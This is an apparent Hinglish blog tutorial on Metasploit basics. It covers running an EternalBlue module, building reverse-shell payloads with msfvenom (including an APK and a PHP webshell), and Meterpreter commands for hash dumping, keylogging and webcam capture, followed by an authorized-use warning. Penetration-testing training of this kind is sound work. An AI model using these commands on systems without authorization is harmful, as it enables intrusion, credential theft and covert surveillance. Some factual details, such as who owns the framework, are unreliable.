---
id: metasploit-basics
title: Metasploit Framework Basics - Exploitation Kaise Karein
excerpt: Metasploit Framework के साथ exploitation सीखें। Payloads, exploits, auxiliary modules, aur post-exploitation techniques का complete introduction।
category: ट्यूटोरियल
date: 2026-06-12
readTime: 11 मिनट
tags: मेटास्प्लॉइट, एक्सप्लॉइटेशन, पेलोड्स, फ्रेमवर्क
featured: false
---

## Metasploit Framework क्या है?

Metasploit Framework दुनिया का सबसे popular penetration testing framework है। इसे HD Moore ने 2003 में बनाया था और अब यह Offensive Security (OSCP exam wali company) के पास है। यह रूबी में लिखा गया है और इसमें हजारों exploits, payloads, aur auxiliary modules हैं।

## Metasploit क्यों ज़रूरी है

- **Automated exploitation**: Manual exploit setup से बचाता है
- **3000+ exploits**: Almost har known vulnerability ke liye module
- **Payload flexibility**: Reverse shells, Meterpreter, bind shells aur bhi bahut kuch
- **Post-exploitation**: Target compromise karne ke baad ka features
- **Active community**: Regularly updated new modules ke saath

## Metasploit Interface

तीन main interfaces hain:

| Interface | Command | Best For |
|-----------|---------|----------|
| msfconsole | `msfconsole` | Interactive use, most powerful |
| msfcli | `msfcli` | Scripting aur automation |
| Armitage | `armitage` | GUI interface, beginners |

हम msfconsole par focus karenge jo sabse zyada use hota hai.

## Metasploit Basic Commands

```bash
msfconsole
```

### Module Search

```bash
search eternalblue
search type:exploit platform:windows
search cve:2021 name:apache
```

### Module Management

```bash
use exploit/windows/smb/ms17_010_eternalblue
info
show options
set RHOSTS 192.168.1.100
run
```

## Understanding Payloads

### Staged vs Stageless

- **Staged** (eg. `windows/meterpreter/reverse_tcp`): Small initial payload download karta hai bada payload
- **Stageless** (eg. `windows/meterpreter_reverse_tcp`): Full payload ek saath bhejta hai

### Common Payloads

| Payload | Use Case |
|---------|----------|
| `windows/meterpreter/reverse_tcp` | Windows systems, flexible |
| `linux/x64/meterpreter/reverse_tcp` | Linux x64 systems |
| `android/meterpreter/reverse_tcp` | Android devices |
| `php/meterpreter_reverse_tcp` | Web servers with PHP |

## Building a Simple Exploit

```bash
# 1. Start msfconsole
msfconsole

# 2. Select exploit
use exploit/multi/handler

# 3. Set payload
set PAYLOAD windows/meterpreter/reverse_tcp

# 4. Set options
set LHOST 192.168.1.10
set LPORT 4444

# 5. Run
exploit
```

## Creating Payloads with Msfvenom

Msfvenom standalone payload generator hai:

```bash
# Windows reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f exe -o shell.exe

# Linux reverse shell
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f elf -o shell.elf

# Android APK
msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o malicious.apk

# PHP webshell
msfvenom -p php/meterpreter_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -o shell.php
```

## Meterpreter Commands

Meterpreter mein aane ke baad yeh commands useful hain:

```bash
help                  # All commands
sysinfo              # System information
getuid               # Current user
getsystem            # Privilege escalation attempt
hashdump            # Windows password hashes
screenshot          # Take screenshot
webcam_snap         # Webcam photo
keyscan_start       # Keylogger start
keyscan_dump        # Captured keystrokes
download file.txt   # Download file
upload file.txt     # Upload file
shell               # System shell
```

## Post-Exploitation Modules

```bash
run post/windows/gather/checkvm
run post/windows/gather/enum_logged_on_users
run post/multi/recon/local_exploit_suggester
```

## Ethical Considerations

**Important:** Metasploit को सिर्फ authorized environments mein use karein. Illegal use:

- Criminal charges
- Jail time
- Heavy fines
- Career destruction

हमेशा written permission लें पहले।

## Conclusion

Metasploit सीखना एक journey है। Basic modules se start karein, phir advanced exploitation aur post-exploitation techniques explore karein. याद रखें — great power comes with great responsibility. Happy (ethical) hacking!
